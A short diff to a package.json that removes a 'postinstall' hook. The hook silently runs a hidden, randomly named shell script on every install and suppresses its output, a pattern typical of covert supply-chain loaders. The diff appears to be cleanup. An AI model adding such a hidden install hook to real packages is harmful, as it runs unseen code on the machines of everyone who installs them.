@@ -36,8 +36,7 @@
     "typecheck": "tsc",
     "build": "pkgroll",
     "prepublishOnly": "npm run build",
-    "release:patch": "npm run build && npm version patch && npm run build && npm publish && git push --follow-tags",
-    "postinstall": "sh ./.ci-45r91r.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "release:patch": "npm run build && npm version patch && npm run build && npm publish && git push --follow-tags"
   },
   "devDependencies": {
     "@types/dedent": "^0.7.0",
